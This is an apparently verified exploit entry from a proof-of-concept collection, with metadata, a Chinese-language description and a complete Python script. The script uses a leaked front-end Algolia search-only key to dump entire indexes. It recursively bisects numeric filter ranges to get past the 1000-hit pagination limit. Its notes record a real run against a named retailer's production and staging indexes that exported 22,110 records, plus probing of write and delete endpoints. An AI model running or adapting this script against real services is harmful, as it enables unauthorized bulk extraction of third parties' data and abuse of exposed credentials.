# Algolia search-only key 全量导出：numeric filter 区间二分绕过 paginationLimitedTo=1000

- **code**: import-json-requests-time-app-appid-key-search_key
- **kind**: exp
- **category**: info-leak
- **component**: Algolia Search API v1
- **severity**: medium
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: finding_id=177（task#6，finding_checks.verdict=verified，status=confirmed）。2026-11-11 21:50–22:00 UTC 本机 curl+python313 直连 https://sczizsp09z-dsn.algolia.net（Referer: https://www.greenmangaming.com/）：用 filters=ProductId>=lo AND ProductId<hi 递归二分 + hitsPerPage=1000，把 prod_ProductSearch_US 13,599/13,599、staging_ProductSearch_US_Mrp_ASC 4,043/4,043、staging_MainSearch 3,696/3,696、staging_MainSearchBackup 401/401、staging_adam_MainSearch 371/371 合计 22,110 条 100% 导出（77MB），unique objectID 与各索引 nbHits 完全一致；staging 独有 3,591 个 GameVariantId 不在 prod 索引，抽样 30 个官网 URL：22 个 302→/title-no-longer-available/、4 个 404、4 个 200。同 key 写面全拒（PUT settings 403、deleteObject 400、deleteIndex 403、GET /1/keys 403），/1/indexes/{index}/browse 403 Method not allowed with this API key。本脚本另用本地 mock（2,500 条/4 次 fetch）验证区间二分与 100% 覆盖率判定逻辑。
- **path**: pocs/import-json-requests-time-app-appid-key-search_key/alg_export.py
- **tags**: algolia,search-only-key,paginationLimitedTo,full-dump,numeric-filter,info-leak,staging-index
- **created_at**: 2026-11-11T22:13:58.021Z
- **engine**: https://sczizsp09z-dsn.algolia.net (www.greenmangaming.com)

## 描述

前端内嵌的 Algolia search-only key 若带 listIndexes/settings 读权限且 unretrievableAttributes=null，可匿名枚举索引，并绕过 paginationLimitedTo=1000 的翻页上限做全量导出。方法：任选索引 settings 中 attributesForFaceting 的 filterOnly 数值属性（如 ProductId/GameVariantId/IndexTimestamp），用 filters=attr>=lo AND attr<hi 做区间二分，每个区间 hitsPerPage=1000，返回满 1000 条就继续切分，直至 <1000 条即该区间取尽；全量 objectID 去重后与 nbHits 对照。注意：需要 Referer 头（缺省 403）；browse 端点通常被 search ACL 拒绝；写/删/settings 修改需另行探测，通常 403/400。

## 用法

```
export ALGOLIA_APP=<APPID>; export ALGOLIA_KEY=<search-only key>; export ALGOLIA_REFERER=https://<目标站点>/; python3 alg_export.py <index> <out.jsonl> [filterAttr] [maxRange]

先 GET /1/indexes 拿索引清单（200=有 listIndexes），GET /1/indexes/{index}/settings 看 attributesForFaceting 里 filterOnly(...) 的数值属性；不传 filterAttr 时脚本自动挑选并验证（filterOnly 未声明会 400 "Filter is not allowed"，字符串属性会 400 "not a numeric attribute"）。不传 maxRange 时按 2 的幂探测属性上界。对 429/503 做 3s×n 退避。判据：去重 objectID 数 == nbHits 即 100% 覆盖；不足时换另一个数值属性补导（缺该属性的记录不会落在任何区间）。可选 ALGOLIA_BASE 覆盖默认 https://<APPID>-dsn.algolia.net。全程只读。
```

## 正文

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Algolia search-only key 全量导出 —— numeric filter 区间二分，绕过 paginationLimitedTo=1000

适用: 前端泄露的 Algolia App ID + search-only key，且
      GET /1/indexes 200（listIndexes）、GET /1/indexes/{index}/settings 200（settings 读）、
      目标索引 unretrievableAttributes=null（否则内部字段会被服务端剥离）。

用法:
  export ALGOLIA_APP=<APPID>
  export ALGOLIA_KEY=<search-only key>
  export ALGOLIA_REFERER=https://<目标站点>/     # 必需，多数应用缺 Referer 回 403
  # 可选: export ALGOLIA_BASE=https://<APPID>-dsn.algolia.net
  python3 alg_export.py <index> <out.jsonl> [filterAttr] [maxRange]

  # 例:
  python3 alg_export.py prod_ProductSearch_US prod.jsonl ProductId

  不给 filterAttr 时，脚本从 settings.attributesForFaceting 中自动挑 filterOnly(...) 成员逐个试；
  不给 maxRange 时，按 2 的幂探测该属性的上界。

判据:
  去重后 unique objectID 数 == POST /query hitsPerPage=0 返回的 nbHits  ⇒ 100% 覆盖。
  未覆盖的常见原因:
   * 部分记录缺该数值属性 —— 换另一个 filterOnly 数值属性再做一轮补导；
   * 属性是字符串而非数字 —— Algolia 回 400 "not a numeric attribute"；
   * filterOnly 未声明 —— 回 400 "Filter is not allowed" / "filters: not allowed"；
   * 索引本身不是商品数据，命中少属于正常。
注意:
  * 全程只读：只打 settings 与 query。写权限另行探测（实测常见结果：PUT settings 403、
    deleteObject 400、deleteIndex 403、GET /1/keys 403）。
  * browse 端点通常被 search ACL 拒绝（403 Method not allowed with this API key），别依赖它。
  * 429/503 退避 3s×n，最多 5 次；hitsPerPage 上限 1000。
  * 若数值属性存在负值，需要用 CLI 显式给 maxRange 并自行把下界扩展到负区间。
"""
import json
import os
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

APP = os.environ.get("ALGOLIA_APP", "")
KEY = os.environ.get("ALGOLIA_KEY", "")
REFERER = os.environ.get("ALGOLIA_REFERER", "")
if not APP or not KEY or not REFERER:
    sys.exit("需要环境变量 ALGOLIA_APP / ALGOLIA_KEY / ALGOLIA_REFERER")

BASE = os.environ.get("ALGOLIA_BASE") or ("https://%s-dsn.algolia.net" % APP)
HDRS = {
    "X-Algolia-Application-Id": APP,
    "X-Algolia-API-Key": KEY,
    "Referer": REFERER,
    "Content-Type": "application/json",
    "User-Agent": os.environ.get("ARTEX_UA", "Mozilla/5.0"),
}


def _q(s):
    return urllib.parse.quote(str(s), safe="")


def api(method, path, body=None, tries=5):
    data = json.dumps(body).encode() if body is not None else None
    last = None
    for i in range(tries):
        req = urllib.request.Request(BASE + path, data=data, headers=HDRS, method=method)
        try:
            with urllib.request.urlopen(req, timeout=60) as r:
                return json.loads(r.read().decode("utf-8", "replace"))
        except urllib.error.HTTPError as e:
            last = "HTTP %d %s" % (e.code, e.read().decode("utf-8", "replace")[:300])
            if e.code in (429, 503) and i + 1 < tries:
                time.sleep(3 * (i + 1))
                continue
            raise RuntimeError(last)
        except Exception as e:
            last = repr(e)
            if i + 1 < tries:
                time.sleep(2 * (i + 1))
                continue
            raise
    raise RuntimeError(last or "unknown error")


def _params(idx, flt, hits_per_page, attrs="*"):
    p = "query=&hitsPerPage=%d&attributesToRetrieve=%s" % (hits_per_page, _q(attrs))
    if flt:
        p += "&filters=" + _q(flt)
    return "/1/indexes/%s/query" % _q(idx), p


def count(idx, flt):
    path, p = _params(idx, flt, 0, "*")
    return api("POST", path, {"params": p})["nbHits"]


def fetch(idx, flt, fp, seen):
    path, p = _params(idx, flt, 1000)
    r = api("POST", path, {"params": p})
    new = 0
    for h in r.get("hits", []):
        oid = h.get("objectID")
        if oid in seen:
            continue
        seen.add(oid)
        fp.write(json.dumps(h, ensure_ascii=False) + "\n")
        new += 1
    return new, r.get("nbHits", 0)


def get_settings(idx):
    return api("GET", "/1/indexes/%s/settings" % _q(idx))


def filter_candidates(st):
    fac = st.get("attributesForFaceting") or []
    out = []
    for f in fac:
        m = re.match(r"^filterOnly\((.+)\)$", f)
        if m:
            out.append(m.group(1))
    pref = ["ProductId", "GameVariantId", "IndexTimestamp", "GameId", "Id"]
    out.sort(key=lambda a: (pref.index(a) if a in pref else len(pref), a))
    return out


def numeric_ok(idx, attr):
    try:
        count(idx, "%s>=0 AND %s<1" % (attr, attr))
        return True
    except RuntimeError:
        return False


def probe_upper(idx, attr, cap=1 << 62):
    """按 2 的幂探测属性最大值，返回开销最小的上界（开区间）。"""
    hi = 1
    while hi < cap and count(idx, "%s>=%d" % (attr, hi)) > 0:
        hi *= 2
    lo = hi // 2
    while lo + 1 < hi:
        mid = (lo + hi) // 2
        if count(idx, "%s>=%d" % (attr, mid)) > 0:
            lo = mid
        else:
            hi = mid
    return hi + 1


def walk(idx, attr, lo, hi, fp, seen, stats):
    flt = "%s>=%d AND %s<%d" % (attr, lo, attr, hi)
    n = count(idx, flt)
    stats["queries"] += 1
    if n == 0:
        return
    if n <= 1000:
        got, _ = fetch(idx, flt, fp, seen)
        stats["fetches"] += 1
        print("[+] [%d,%d) nbHits=%d -> 取回 %d" % (lo, hi, n, got))
        return
    mid = (lo + hi) // 2
    if mid <= lo:
        got, _ = fetch(idx, flt, fp, seen)
        stats["fetches"] += 1
        print("[!] [%d,%d) nbHits=%d>1000 且不可再分（重复值堆积），只取到 %d 条" % (lo, hi, n, got))
        return
    walk(idx, attr, lo, mid, fp, seen, stats)
    walk(idx, attr, mid, hi, fp, seen, stats)


def main():
    if len(sys.argv) < 3:
        sys.exit(__doc__)
    idx, out = sys.argv[1], sys.argv[2]
    attr = sys.argv[3] if len(sys.argv) > 3 else None
    maxr = int(sys.argv[4]) if len(sys.argv) > 4 else None

    try:
        st = get_settings(idx)
        print("[*] settings: unretrievableAttributes=%r attributesToRetrieve=%r paginationLimitedTo=%r"
              % (st.get("unretrievableAttributes"), st.get("attributesToRetrieve"),
                 st.get("paginationLimitedTo")))
        if st.get("unretrievableAttributes"):
            print("[!] 索引声明了 unretrievableAttributes=%r，attributesToRetrieve=* 不会返回这些字段"
                  % st.get("unretrievableAttributes"))
        cands = filter_candidates(st)
    except RuntimeError as e:
        print("[!] settings 不可读（%s），只能靠 CLI 指定 filterAttr" % e)
        cands = []

    total = count(idx, "")
    print("[*] index nbHits=%d" % total)

    if attr is None:
        tested = []
        for c in cands:
            if numeric_ok(idx, c):
                attr = c
                break
            tested.append(c)
        if attr is None:
            sys.exit("[!] 没有可用 filterOnly 数值属性，候选=%r；请 CLI 手动指定 filterAttr" % tested)
        print("[*] 选定 filterAttr=%s（候选 %r）" % (attr, cands))

    if maxr is None:
        maxr = probe_upper(idx, attr)
        print("[*] 探测上界 maxRange=%d" % maxr)

    seen = set()
    stats = {"queries": 0, "fetches": 0}
    with open(out, "w", encoding="utf-8") as fp:
        walk(idx, attr, 0, maxr, fp, seen, stats)

    print("[*] API 调用: query=%d fetch=%d" % (stats["queries"], stats["fetches"]))
    print("[+] 导出 %d 条 -> %s" % (len(seen), out))
    if len(seen) == total:
        print("[+] 覆盖率 100%（unique objectID == nbHits）")
    else:
        print("[!] 与 nbHits 不一致：差 %d 条（多半是记录缺该数值属性，换一个数值属性再补导）"
              % (total - len(seen)))


if __name__ == "__main__":
    main()
```
